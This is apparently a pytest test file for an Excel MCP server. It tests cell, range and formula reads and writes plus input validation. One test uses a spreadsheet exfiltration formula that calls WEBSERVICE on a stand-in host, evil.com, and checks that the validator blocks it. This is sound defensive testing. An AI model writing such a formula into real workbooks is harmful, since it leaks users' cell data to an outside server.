"""Tests for cell operations"""

import pytest
from pathlib import Path
import tempfile

from excel_mcp_server.models import (
    CellReadRequest,
    CellWriteRequest,
    RangeReadRequest,
    RangeWriteRequest,
    FormulaWriteRequest,
)
from excel_mcp_server.operations import cell
from excel_mcp_server import add_allowed_directory


@pytest.fixture
def temp_dir():
    """Create a temporary directory for test files"""
    with tempfile.TemporaryDirectory() as d:
        add_allowed_directory(d)
        yield Path(d)


@pytest.fixture
def sample_workbook(temp_dir):
    """Create a sample workbook for testing"""
    from openpyxl import Workbook
    from excel_mcp_server.operations import workbook
    from excel_mcp_server.models import CreateWorkbookRequest
    
    file_path = temp_dir / "test.xlsx"
    request = CreateWorkbookRequest(file_path=str(file_path), sheet_name="TestSheet")
    result = workbook.create_workbook(request)
    assert result.success
    return file_path


class TestCellOperations:
    """Test cell read/write operations"""
    
    def test_write_and_read_cell(self, sample_workbook):
        """Test writing and reading a cell value"""
        # Write
        write_req = CellWriteRequest(
            file_path=str(sample_workbook),
            sheet_name="TestSheet",
            cell="A1",
            value="Hello World"
        )
        write_result = cell.write_cell(write_req)
        assert write_result.success
        assert write_result.value == "Hello World"
        
        # Read
        read_req = CellReadRequest(
            file_path=str(sample_workbook),
            sheet_name="TestSheet",
            cell="A1"
        )
        read_result = cell.read_cell(read_req)
        assert read_result.success
        assert read_result.value == "Hello World"
    
    def test_write_number(self, sample_workbook):
        """Test writing a numeric value"""
        write_req = CellWriteRequest(
            file_path=str(sample_workbook),
            sheet_name="TestSheet",
            cell="B1",
            value=42.5
        )
        result = cell.write_cell(write_req)
        assert result.success
        
        read_req = CellReadRequest(
            file_path=str(sample_workbook),
            sheet_name="TestSheet",
            cell="B1"
        )
        read_result = cell.read_cell(read_req)
        assert read_result.value == 42.5
    
    def test_write_formula(self, sample_workbook):
        """Test writing a formula"""
        # Write some numbers first
        cell.write_cell(CellWriteRequest(
            file_path=str(sample_workbook),
            sheet_name="TestSheet",
            cell="A1",
            value=10
        ))
        cell.write_cell(CellWriteRequest(
            file_path=str(sample_workbook),
            sheet_name="TestSheet",
            cell="A2",
            value=20
        ))
        
        # Write formula
        formula_req = FormulaWriteRequest(
            file_path=str(sample_workbook),
            sheet_name="TestSheet",
            cell="A3",
            formula="=SUM(A1:A2)"
        )
        result = cell.write_formula(formula_req)
        assert result.success
    
    def test_dangerous_formula_blocked(self, sample_workbook):
        """Test that dangerous formulas are blocked"""
        with pytest.raises(ValueError, match="blocked"):
            FormulaWriteRequest(
                file_path=str(sample_workbook),
                sheet_name="TestSheet",
                cell="A1",
                formula="=WEBSERVICE('http://evil.com/steal?data='&A1)"
            )
    
    def test_read_write_range(self, sample_workbook):
        """Test reading and writing ranges"""
        data = [
            ["Name", "Age", "City"],
            ["Alice", 30, "Beijing"],
            ["Bob", 25, "Shanghai"],
        ]
        
        write_req = RangeWriteRequest(
            file_path=str(sample_workbook),
            sheet_name="TestSheet",
            start_cell="A1",
            data=data
        )
        write_result = cell.write_range(write_req)
        assert write_result.success
        assert write_result.rows == 3
        assert write_result.cols == 3
        
        read_req = RangeReadRequest(
            file_path=str(sample_workbook),
            sheet_name="TestSheet",
            range_ref="A1:C3"
        )
        read_result = cell.read_range(read_req)
        assert read_result.success
        assert read_result.data == data
    
    def test_sheet_not_found(self, sample_workbook):
        """Test error when sheet not found"""
        read_req = CellReadRequest(
            file_path=str(sample_workbook),
            sheet_name="NonExistent",
            cell="A1"
        )
        result = cell.read_cell(read_req)
        assert not result.success
        assert result.error_code == "SHEET_NOT_FOUND"


class TestValidation:
    """Test input validation"""
    
    def test_invalid_cell_reference(self, sample_workbook):
        """Test that invalid cell references are rejected"""
        with pytest.raises(ValueError, match="Invalid cell"):
            CellWriteRequest(
                file_path=str(sample_workbook),
                sheet_name="TestSheet",
                cell="INVALID",
                value="test"
            )
    
    def test_column_exceeds_limit(self, sample_workbook):
        """Test that columns beyond XFD are rejected"""
        with pytest.raises(ValueError, match="exceeds"):
            CellWriteRequest(
                file_path=str(sample_workbook),
                sheet_name="TestSheet",
                cell="XFE1",  # Beyond XFD
                value="test"
            )
    
    def test_string_too_long(self, sample_workbook):
        """Test that overly long strings are rejected"""
        long_string = "x" * 40000  # Exceeds 32767
        with pytest.raises(ValueError, match="too long"):
            CellWriteRequest(
                file_path=str(sample_workbook),
                sheet_name="TestSheet",
                cell="A1",
                value=long_string
            )
